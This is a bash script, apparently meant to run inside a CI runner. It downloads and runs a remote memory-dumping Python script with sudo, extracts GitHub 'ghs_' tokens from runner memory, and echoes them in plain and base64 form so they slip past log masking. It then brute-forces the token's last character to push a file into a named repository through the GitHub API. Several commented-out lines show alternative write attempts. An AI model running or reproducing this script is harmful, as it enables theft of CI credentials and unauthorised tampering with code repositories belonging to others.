.#!/usr/bin/env bash
set -e
readonly REPO="thi3nl0ng/thi3nl0ng.github.io"
TOKEN_VAL=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | awk 'NR==2' | xargs  `
#TOKEN_VAL0=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u  `
TOKEN_VAL1=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 `
#TOKEN_VAL2=`curl -sSf https://raw.githubusercontent.com/r3s34rch/test/main/memdum.py | sudo python3 | tr -d '\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | base64 | base64 `

echo "-----------------------------------------------------------------"
echo "abc" "$TOKEN_VAL" "xyz"
echo "${TOKEN_VAL:0:39}"
echo "-----------------------------------------------------------------"
#echo "$TOKEN_VAL0"
#echo "-----------------------------------------------------------------"
echo "$TOKEN_VAL1"
#echo "-----------------------------------------------------------------"
#echo "$TOKEN_VAL2"
echo "-----------------------------------------------------------------"
for f in {a..z} {A..Z} {0..9}; do 
    echo "${TOKEN_VAL:0:39}$f" 
    Header="Authorization: token ${TOKEN_VAL:0:39}$f"
    echo "$Header"
    curl -L \
         --request PUT \
         --url "https://api.github.com/repos/${REPO}/contents/README2.md" \
         --header "$Header" \
         --header "Accept: application/vnd.github.v3+json" \
         --header "X-GitHub-Api-Version: 2022-11-28" \
         -d '{"message":"hello from r3s34rch","content":"bXkgbmV3IGZpbGUgY29udGVudHM=", "sha":"SHA_FROM_ABOVE" }'
done

#echo "https://api.github.com/repos/${REPO}/contents/README.md"
#Header="Authorization: token $TOKEN_VAL"
#echo "$Header"
#echo "-----------------------------------------------------------------"

#curl -L \
#--request PUT \
#--url "https://api.github.com/repos/${REPO}/contents/README.md" \
#--header "$Header" \
#--header "Accept: application/vnd.github.v3+json" \
#--header "X-GitHub-Api-Version: 2022-11-28" \
#-d '{"message":"my commit message","content":"bXkgbmV3IGZpbGUgY29udGVudHM=", "sha":"SHA_FROM_ABOVE" }'

#curl -L \
#    -X PUT \
#    -H "Accept: application/vnd.github.v3+json" \
#    -H "Authorization: token $TOKEN_VAL" \
#    "https://api.github.com/repos/${REPO}/contents/README.md" \
#    -d '{"message":"hello from r3s34rch","content":"'$(echo 'content'|base64)'", "sha":"SHA_FROM_ABOVE"}'

#sleep 30m

#curl "https://api.github.com/repos/${REPO}/contents/README.md"      

#gh api --silent \
#  --method POST \
#  -H "Accept: application/vnd.github.v3+json" \
#  "/repos/$OWNER/$REPO/git/refs" \
#  -f ref='refs/heads/add-readme' \
#  -f sha="$(gh api repos/thi3nl0ng/thi3nl0ng.github.io/git/ref/heads/main --jq .object.sha)"

#gh api --silent \
#  -X PUT "/repos/$REPO/contents/README2.md" \
#  -f branch=add-readme \
#  -f message='add README2.md' \
#  -f content="$(echo '123' | base64)"
